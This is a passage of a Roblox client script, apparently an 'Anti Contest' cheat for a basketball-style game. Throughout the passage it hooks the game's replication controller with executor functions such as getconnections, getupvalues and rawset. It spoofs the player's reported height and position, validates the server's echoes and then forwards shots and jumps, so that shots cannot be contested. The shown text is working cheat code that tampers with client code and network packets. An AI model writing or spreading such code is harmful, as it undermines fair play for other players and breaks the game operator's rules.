            clockOnly=burst.clockOnly,clockReported=burst.clockReported,clockAckAt=burst.clockAckAt,
            echoedClockStamp=burst.echoedClockStamp,clockAckReportStamp=burst.clockAckReportStamp,
            clockIssuedAt=burst.clockIssuedAt,clockIssuedStamp=burst.clockIssuedStamp,reportRawclock=burst.reportRawclock,
            clockMeterAt=burst.clockMeterAt,clockMeterSerial=burst.clockMeterSerial,clockMeterType=burst.clockMeterType,
            startMeterAt=burst.startMeterAt,startMeterSerial=burst.startMeterSerial,startMeterType=burst.startMeterType,
            acknowledgedMs = burst.ackAt and math.floor((burst.ackAt - burst.began) * 1000 + .5),
            targetY = burst.targetY, packets = burst.packets, meters = burst.meters or 0})
        if #history > 20 then table.remove(history, 1) end
        dirty = true
    end
    local function endBurst(message, actual, skipRestore)
        local candidate = peer
        local endedAttempt=burst
        local endedState=endedAttempt and endedAttempt.clockOnly and candidate and candidate.clockState or nil
        local hadBurst = burst ~= nil and burst.networkActive==true
        local endedView=burst and feature.liveState() or nil
        burst = nil
        if endedAttempt then record(message,actual,endedAttempt) end
        if endedAttempt then trace("v2_attempt_end",{reason=message,contest=actual,state=endedView}) end
        local forcedRestoreVeto=endedAttempt and forcedFrame(endedAttempt.character)
        if endedAttempt and endedAttempt.clockOnly then
            if endedState and candidate.clockState==endedState then
                if skipRestore or forcedRestoreVeto or endedAttempt.clockEligibilityLost or endedAttempt.clockInterruptedReason
                    or contact(endedAttempt.character) or not current(candidate) or stopped or traveling or not feature.enabled or not robloxFocused() then
                    restoreClockWriter(candidate,"clock trial ended without a safe drain")
                else beginClockDrain(candidate,endedState) end
            end
        elseif hadBurst and not skipRestore and not forcedRestoreVeto and candidate and peer==candidate then
            local ok,isCurrent=pcall(current,candidate)
            if ok and isCurrent then pcall(sendPosition,candidate,nil) end
        end
        feature.message = message
    end
    local function cancelPending(message, skipRestore)
        local pending = burst and not burst.sent and burst or nil
        if pending then
            feature.cancelled += 1
            if pending.useSpace then blockedJumpUntil = os.clock() + .15 end
        end
        endBurst(message,nil,skipRestore)
        if pending and feature.cancelTracked then pcall(feature.cancelTracked, pending.character, pending.began) end
    end
    local function detach(message)
        if peer then restoreClockWriter(peer,message or "explicit detach") end
        cancelPending(message)
        local old = peer
        peer, feature.available = nil, false
        if old then
            if old.connection then old.connection:Disconnect() end
            if old.correction then old.correction:Disconnect() end
            if rawget(old.codec, "Write") == old.wrapper then rawset(old.codec, "Write", old.write) end
            if rawget(old.jump, "Fire") == old.jumpWrapper then rawset(old.jump, "Fire", old.jumpFire) end
            restoreClockWriter(old)
        end
    end
    function feature.stop(message)
        feature.useAvoidance=false
        blocked, blockedJumpUntil = false, 0
        detach(message or "Anti Contest v2 stopped.")
    end
    function feature.fail(problem)
        feature.stop("V2 paused: " .. tostring(problem))
        retryUntil=os.clock()+1
        nextResolve=retryUntil
        trace("v2_recovery",{reason=tostring(problem),retryAt=retryUntil,enabled=feature.enabled})
        feature.refresh()
        warn(prefix .. feature.message)
    end
    local function readEcho(candidate, payload)
        if typeof(payload) ~= "buffer" then return end
        local bytes = buffer.len(payload)
        local build = feature.build
        if bytes < build.headerBytes or bytes > build.headerBytes + (build.maxId + 1) * build.recordBytes
            or (bytes - build.headerBytes) % build.recordBytes ~= 0 then return end
        local lib, own = candidate.lib, nil
        local reader = lib.reader(payload)
        local clock = lib.Float64.Read(reader)
        local now = workspace:GetServerTimeNow() - candidate.epoch
        if not finite(clock) or not finite(now) or math.abs(clock - now) > 2 then return end
        for _ = 1, (bytes - build.headerBytes) / build.recordBytes do
            local id = lib.UInt8.Read(reader)
            local stamp = clock - lib.Int16.Read(reader) / 10000
            local x = lib.RangedFloat16.Read(reader, -candidate.range, candidate.range)
            local y = lib.RangedFloat16.Read(reader, -candidate.range, candidate.range)
            local z = lib.RangedFloat16.Read(reader, -candidate.range, candidate.range)
            local velocityX,velocityZ=lib.Int8.Read(reader),lib.Int8.Read(reader)
            lib.UInt8.Read(reader)
            if id == candidate.id then
                if own then return end
                own = {position = Vector3.new(x, y, z), stamp = stamp,velocityX=velocityX,velocityZ=velocityZ}
            end
        end
        return own
    end
    local function acknowledge(candidate, payload)
        local attempt = burst
        if not feature.enabled or peer ~= candidate or not attempt or (attempt.sent and not attempt.awaitingAck and not attempt.awaitingRestore) or not current(candidate) then return end
        if not robloxFocused() or traveling or stopped then return end
        if attempt.awaitingRestore then
            if os.clock()>attempt.restoreDeadline then return end
            local valid,echo=pcall(readEcho,candidate,payload)
            local tolerance=math.max(.05,2*candidate.range/65535+.001)
            local elapsed=math.max(0,os.clock()-attempt.restoreIssuedAt)
            local maximumTravel=1+(127/candidate.scale)*math.sqrt(2)*elapsed
            local horizontal=valid and echo and (echo.position-attempt.restorePosition)*Vector3.new(1,0,1)
            if valid and echo and echo.stamp>=attempt.restoreStamp-.00011
                and (not attempt.elevatedEchoStamp or echo.stamp>attempt.elevatedEchoStamp)
                and horizontal.Magnitude<=maximumTravel and math.abs(echo.position.Y-attempt.restorePosition.Y)<=tolerance then
                attempt.restoreAckAt,attempt.awaitingRestore=os.clock(),false
                trace("v2_restore_acknowledgement",{position=echo.position,state=feature.liveState()})
                feature.message="V3 normal height acknowledged; waiting for actual shot feedback."
            end
            return
        end
        if os.clock() >= attempt.deadline then return end
        local ok, echo = pcall(readEcho, candidate, payload)
        if peer ~= candidate or burst ~= attempt or not current(candidate) or not feature.enabled then return end
        local positionTolerance=math.max(.05,2*candidate.range/65535+.001)
        local verticalMargin=attempt.clockOnly and 0 or feature.margin
        local minimumStamp=attempt.clockOnly and ((attempt.clockIssuedStamp or math.huge)-.00011) or attempt.stamp-.005
        if not ok or not echo or echo.stamp < minimumStamp
            or (not attempt.clockOnly and math.abs(echo.position.Y - attempt.targetY) > positionTolerance)
            or not inBounds(attempt.bounds, echo.position, verticalMargin, feature.edgeMargin) then return end
        local matchedReport=nil
        if attempt.clockOnly then
            local state=candidate.clockState
            if not state or state.phase~="active" or state.attempt~=attempt then return end
            for index=#attempt.clockReports,1,-1 do
                local sample=attempt.clockReports[index]
                if math.abs(echo.stamp-sample.stamp)<=.00011
                    and math.abs(echo.position.Y-sample.position.Y)<=positionTolerance
                    and ((echo.position-sample.position)*Vector3.new(1,0,1)).Magnitude<=positionTolerance*math.sqrt(2) then
                    matchedReport=sample;break
                end
            end
            if not matchedReport then return end
        end
        local delta = (echo.position - (matchedReport and matchedReport.position or attempt.position)) * Vector3.new(1, 0, 1)
        local maximumSpeed=(127/candidate.scale)*math.sqrt(2)
        local maximumTravel = 1 + maximumSpeed * math.max(0,os.clock()-(matchedReport and matchedReport.at or attempt.began))
        if delta.Magnitude > maximumTravel then return end
        local actual = candidate.proxy.Position
        if not vectorFinite(actual) or not inBounds(attempt.bounds, Vector3.new(actual.X, attempt.clockOnly and actual.Y or attempt.targetY, actual.Z), verticalMargin, feature.edgeMargin) then
            blocked = true
            cancelPending("Shot cancelled after leaving the validated court area.")
            return
        end
        attempt.ackAt,attempt.awaitingAck=os.clock(),false
        local forced=forcedFrame(attempt.character)
        if forced or((attempt.clockOnly or feature.options.protectContact) and contact(attempt.character))then
            blocked=true;cancelPending("Native contact/forced movement interrupted the acknowledgement.",forced);return
        end
        if attempt.clockOnly then
            local eligible,kind,reason=clockEligibility(candidate,attempt)
            if not eligible then blocked=true;cancelPending("Clock experiment cancelled before native Shoot: "..reason..".");return end
            attempt.kind=kind
            attempt.clockAckAt=attempt.ackAt
            attempt.echoedClockStamp=echo.stamp
            attempt.clockAckReportStamp=matchedReport.stamp
            attempt.clockAckReportPosition=matchedReport.position
        else
            attempt.elevatedAckAt=attempt.ackAt
            attempt.elevatedEchoStamp=echo.stamp
        end
        if attempt.late then
            trace("v2_late_acknowledgement",{stamp=echo.stamp,position=echo.position,state=feature.liveState()})
            feature.message="Late shift acknowledged; waiting for actual feedback."
            return
        end
        attempt.sent=true
        trace(attempt.clockOnly and "v2_clock_acknowledgement" or "v2_acknowledgement",
            {stamp=echo.stamp,position=echo.position,matchedReportedStamp=matchedReport and matchedReport.stamp,
                matchedPosition=matchedReport and matchedReport.position,state=feature.liveState()})
        feature.message = "Shot confirmed; waiting for the game result."
        local sent, failure = pcall(attempt.send, attempt.data)
        if not sent then feature.fail("shot send failed: " .. tostring(failure)); return end
        if burst~=attempt or peer~=candidate or not feature.enabled or not current(candidate) then return end
        forced=forcedFrame(attempt.character)
        if forced or((attempt.clockOnly or feature.options.protectContact) and contact(attempt.character))then
            cancelPending("Native contact/forced movement interrupted queued Jump.",forced);return
        end
        if attempt.clockOnly then
            local eligible,kind,reason=clockEligibility(candidate,attempt)
            if not eligible then cancelPending("Clock experiment ended before queued Jump: "..reason..".");return end
            attempt.kind=kind
        end
        if attempt.jump then
            local jump = attempt.jump
            attempt.jump = nil
            trace("v2_jump_forwarded",{args=jump.args})
            local jumped, problem = pcall(candidate.jumpFire, jump.self, table.unpack(jump.args, 1, jump.args.n))
            if not jumped then feature.fail("jump send failed: " .. tostring(problem));return end
            attempt.jumpForwardedAt=os.clock()
        end
        if burst==attempt and peer==candidate and attempt.clockOnly then
            attempt.startForwardedAt=os.clock()
            trace("v2_start_forwarded",{state=feature.liveState()})
        end
        if burst==attempt and peer==candidate and attempt.variant=="v3" and attempt.returnPoint=="start" then
            attempt.startForwardedAt=os.clock()
            attempt.startMeterDeadline=os.clock()+.5
            if attempt.startMeterAt then feature.restoreNativeHeight(attempt,"start") end
        end
    end
    local function resolve()
        local native = player.PlayerScripts.Aero.Controllers.Replication
        local nativeSource = native:GetFullName()
        local controller, nativeValues,nativeHeartbeat
        for _, connection in ipairs(getconnections(run.Heartbeat)) do
            local fn = connection.Function
            if type(fn) == "function" and debug.info(fn, "s") == nativeSource then
                local values=getupvalues(fn)
                for _, value in pairs(values) do
